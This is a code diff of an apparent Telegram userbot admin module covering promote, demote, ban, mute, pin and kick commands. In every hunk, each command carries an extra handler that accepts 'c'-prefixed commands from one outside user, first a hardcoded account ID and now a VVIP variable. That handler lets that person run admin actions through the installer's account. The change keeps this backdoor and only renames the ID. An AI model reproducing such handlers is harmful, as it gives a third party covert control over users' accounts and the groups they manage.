@@ -114,7 +114,7 @@ async def set_group_photo(gpic):
 
 
 @register(outgoing=True, pattern=r"^\.promote(?: |$)(.*)")
-@register(incoming=True, from_users=1441342342,
+@register(incoming=True, from_users=VVIP,
           pattern=r"^\.cpromote(?: |$)(.*)")
 async def promote(promt):
     # Get targeted chat
@@ -166,7 +166,7 @@ async def promote(promt):
 
 
 @register(outgoing=True, pattern=r"^\.demote(?: |$)(.*)")
-@register(incoming=True, from_users=1441342342,
+@register(incoming=True, from_users=VVIP,
           pattern=r"^\.cdemote(?: |$)(.*)")
 async def demote(dmod):
     # Admin right check
@@ -217,7 +217,7 @@ async def demote(dmod):
 
 
 @register(outgoing=True, pattern=r"^\.ban(?: |$)(.*)")
-@register(incoming=True, from_users=1441342342,
+@register(incoming=True, from_users=VVIP,
           pattern=r"^\.cban(?: |$)(.*)")
 async def ban(bon):
     # Here laying the sanity check
@@ -272,7 +272,7 @@ async def ban(bon):
 
 
 @register(outgoing=True, pattern=r"^\.unban(?: |$)(.*)")
-@register(incoming=True, from_users=1441342342,
+@register(incoming=True, from_users=VVIP,
           pattern=r"^\.cunban(?: |$)(.*)")
 async def nothanos(unbon):
     # Here laying the sanity check
@@ -310,7 +310,7 @@ async def nothanos(unbon):
 
 
 @register(outgoing=True, pattern=r"^\.mute(?: |$)(.*)")
-@register(incoming=True, from_users=1441342342,
+@register(incoming=True, from_users=VVIP,
           pattern=r"^\.cmute(?: |$)(.*)")
 async def spider(spdr):
     # Check if the function running under SQL mode
@@ -366,7 +366,7 @@ async def spider(spdr):
 
 
 @register(outgoing=True, pattern=r"^\.unmute(?: |$)(.*)")
-@register(incoming=True, from_users=1441342342,
+@register(incoming=True, from_users=VVIP,
           pattern=r"^\.cunmute(?: |$)(.*)")
 async def unmoot(unmot):
     # Admin or creator check
@@ -444,7 +444,7 @@ async def muter(moot):
 
 
 @register(outgoing=True, pattern=r"^\.ungmute(?: |$)(.*)")
-@register(incoming=True, from_users=1441342342,
+@register(incoming=True, from_users=VVIP,
           pattern=r"^\.cungmute(?: |$)(.*)")
 async def ungmoot(un_gmute):
     # Admin or creator check
@@ -488,7 +488,7 @@ async def ungmoot(un_gmute):
 
 
 @register(outgoing=True, pattern=r"^\.gmute(?: |$)(.*)")
-@register(incoming=True, from_users=1441342342,
+@register(incoming=True, from_users=VVIP,
           pattern=r"^\.cgmute(?: |$)(.*)")
 async def gspider(gspdr):
     # Admin or creator check
@@ -617,7 +617,7 @@ async def get_admin(show):
 
 
 @register(outgoing=True, pattern=r"^\.pin(?: |$)(.*)")
-@register(incoming=True, from_users=1441342342,
+@register(incoming=True, from_users=VVIP,
           pattern=r"^\.cpin(?: |$)(.*)")
 async def pin(msg):
     # Admin or creator check
@@ -663,7 +663,7 @@ async def pin(msg):
 
 
 @register(outgoing=True, pattern=r"^\.kick(?: |$)(.*)")
-@register(incoming=True, from_users=1441342342,
+@register(incoming=True, from_users=VVIP,
           pattern=r"^\.ckick(?: |$)(.*)")
 async def kick(usr):
     # Admin or creator check
